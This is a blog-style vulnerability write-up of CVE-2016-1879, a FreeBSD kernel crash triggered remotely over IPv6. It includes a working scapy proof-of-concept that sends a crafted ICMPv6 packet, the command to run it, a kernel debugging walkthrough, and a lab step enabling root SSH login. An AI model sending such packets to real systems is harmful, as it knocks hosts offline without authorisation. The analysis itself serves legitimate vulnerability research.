---
layout:	   post
title:		 [CVE-2016-1879]FreeBSD kernel crash
author:		 wooy0ung
tags:		   cve
category:  exploit
---


>[Analysis Environment]  
>system: FreeBSD 10.1 release amd64  
>attack machine: ubuntu 16.04.3 amd64  
>description:  
>You can get more information in this website:   
>[FreeBSD Remote DoS Exploit](http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html)  
<!-- more -->


reference to compile bsd kernel:
[]()

promise your bsd kernel can dump core after crashing
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x001.png)

open your bsd ssh permission
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x002.png)
change it into
```
$ vi /etc/ssh/sshd_config
PermitRootLogin yes
```

get mac & ipv6，-I argument means network card of your ubuntu
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x003.png)

poc.py
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import argparse
from scapy.all import *
 
def get_args():
    parser = argparse.ArgumentParser(description='#' * 78, epilog='#' * 78)
    parser.add_argument("-m", "--dst_mac", type=str, help="FreeBSD mac address")
    parser.add_argument("-i", "--dst_ipv6", type=str, help="FreeBSD IPv6 address")
    parser.add_argument("-I", "--iface", type=str, help="Iface")
    options = parser.parse_args()
 
    if options.dst_mac is None or options.dst_ipv6 is None:
        parser.print_help()
        exit()
 
    return options
 
if __name__ == '__main__':
    options = get_args()
 
    sendp(Ether(dst=options.dst_mac) / IPv6(dst=options.dst_ipv6) / ICMPv6DestUnreach() / IPv6(nh=132,
                                                                                               src=options.dst_ipv6,
                                                                                               dst='fe80::230:56ff:fea6:648c'),
          iface=options.iface)
```

execute poc.py bsd will crash，and crash files generated in /var/crash
```
$ python poc.py -m 00:0c:29:b9:1f:0b -i fe80::20c:29ff:feb9:1f0b -I ens33
.
Sent 1 packets.
```

ICMPv6DestUnreach()：send a error icmp package
IPv6(nh=132,...)：nexthread=132
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x004.png)

cd to /usr/obj/usr/src/sys/MYKERNEL/，and launch kgdb to debug crash core
```
$ kgdb kernel.debug /var/crash/vmcore.1 
```
input "bt" to get stack backtrace
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x005.png)

open /usr/src/sys/kern/uipc_mbuf.c
```
/*
 * Copy data from an mbuf chain starting "off" bytes from the beginning,
 * continuing for "len" bytes, into the indicated buffer.
 */
void
m_copydata(const struct mbuf *m, int off, int len, caddr_t cp)
{
  u_int count;

  KASSERT(off >= 0, ("m_copydata, negative off %d", off));
  KASSERT(len >= 0, ("m_copydata, negative len %d", len));
  while (off > 0) {
    KASSERT(m != NULL, ("m_copydata, offset > size of mbuf chain"));//第一个m的assert
    if (off < m->m_len)
      break;
    off -= m->m_len;
    m = m->m_next;
  }
  while (len > 0) { //884行
    KASSERT(m != NULL, ("m_copydata, length > size of mbuf chain")); //885行
        //这里以下不重要
        //这里以下不重要
    count = min(m->m_len - off, len);
    bcopy(mtod(m, caddr_t) + off, cp, count);
    len -= count;
    cp += count;
    off = 0;
    m = m->m_next;
  }
}
```
kernel stop by "while(len > 0) { KASSERT(m != NULL...)..."，maybe m=m->m_next <-- 0

backtrace to last function
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x006.png)

open /usr/src/sys/netinet6/sctp6_usrreq.c
```
void sctp6_ctlinput(int cmd, struct sockaddr *pktdst, void *d)
{
  struct sctphdr sh;
  struct ip6ctlparam *ip6cp = NULL;
  uint32_t vrf_id;

  vrf_id = SCTP_DEFAULT_VRFID;

  if (pktdst->sa_family != AF_INET6 ||
      pktdst->sa_len != sizeof(struct sockaddr_in6))
    return;

  if ((unsigned)cmd >= PRC_NCMDS)
    return;
  if (PRC_IS_REDIRECT(cmd)) {
    d = NULL;
  } else if (inet6ctlerrmap[cmd] == 0) {
    return;
  }
  /* if the parameter is from icmp6, decode it. */
  if (d != NULL) {
    ip6cp = (struct ip6ctlparam *)d;
  } else {
    ip6cp = (struct ip6ctlparam *)NULL;
  }

  if (ip6cp) {
    /*
     * XXX: We assume that when IPV6 is non NULL, M and OFF are
     * valid.
     */
    /* check if we can safely examine src and dst ports */
    struct sctp_inpcb *inp = NULL;
    struct sctp_tcb *stcb = NULL;
    struct sctp_nets *net = NULL;
    struct sockaddr_in6 final;

    if (ip6cp->ip6c_m == NULL)
      return;

    bzero(&sh, sizeof(sh));
    bzero(&final, sizeof(final));
    inp = NULL;
    net = NULL;
    m_copydata(ip6cp->ip6c_m, ip6cp->ip6c_off, sizeof(sh),
        (caddr_t)&sh);
    
        ...
        后面不重要
```
type of "d" change by "ip6cp = (struct ip6ctlparam *)d"

get "ip6cp"
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x007.png)

we can confirm "m->m_next=NULL"，and "len=88"
![](/assets/img/exploit/2018-05-04-cve-2016-1879/0x008.png)

because of triggering KASSERT，kernel would crash